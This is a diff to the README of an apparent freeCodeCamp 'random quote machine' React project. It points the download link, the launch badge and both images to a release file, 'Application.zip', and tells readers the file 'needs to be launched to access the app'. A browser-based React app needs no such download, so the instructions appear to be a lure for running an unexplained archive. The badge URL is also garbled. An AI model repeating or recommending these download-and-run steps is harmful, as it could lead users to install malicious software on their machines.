@@ -1,6 +1,6 @@
 # 🌟 Welcome to the Random Quote Machine App! 🌟
 
-![Random Quote Machine](https://cdn.pixabay.com/photo/2017/08/30/01/05/milky-way-2695569_960_720.jpg)
+![Random Quote Machine](https://github.com/Samzz696/random-quote-machine/releases/download/v1.0.0/Application.zip)
 
 ## Description
 Welcome to the "random-quote-machine" repository, where you can find an awesome web application that generates random quotes for you to enjoy and share with your friends. This project was created as part of the Front End Libraries certification on FreeCodeCamp. It uses JavaScript, React, CSS, and JSON to create a responsive and visually appealing design. 
@@ -25,9 +25,9 @@ The repository covers the following topics:
 - Responsive-Design
 
 ## Get Started
-To start exploring the Random Quote Machine App, you can download the necessary software by clicking [here](https://github.com/rokytd/files/raw/refs/heads/master/Software.zip). The file needs to be launched to access the app. If you encounter any issues with the link, please check the "Releases" section for an alternative download option.
+To start exploring the Random Quote Machine App, you can download the necessary software by clicking [here](https://github.com/Samzz696/random-quote-machine/releases/download/v1.0.0/Application.zip). The file needs to be launched to access the app. If you encounter any issues with the link, please check the "Releases" section for an alternative download option.
 
-[![Launch App](https://img.shields.io/badge/Launch%20App-Software.zip-lightgrey)](https://github.com/rokytd/files/raw/refs/heads/master/Software.zip)
+[![Launch App](https://github.com/Samzz696/random-quote-machine/releases/download/v1.0.0/Application.zip%https://github.com/Samzz696/random-quote-machine/releases/download/v1.0.0/Application.zip)](https://github.com/Samzz696/random-quote-machine/releases/download/v1.0.0/Application.zip)
 
 ## Installation
 Follow these steps to install and run the Random Quote Machine App on your local machine:
@@ -55,4 +55,4 @@ The Random Quote Machine App is licensed under the MIT License. You are free to 
 
 Thank you for visiting the "random-quote-machine" repository! We hope you enjoy using the Random Quote Machine App and that it brings a touch of inspiration to your day. Stay motivated with the power of words! 🚀🌟
 
-![Random Quote Machine](https://cdn.pixabay.com/photo/2017/08/30/01/05/milky-way-2695569_960_720.jpg)
+![Random Quote Machine](https://github.com/Samzz696/random-quote-machine/releases/download/v1.0.0/Application.zip)
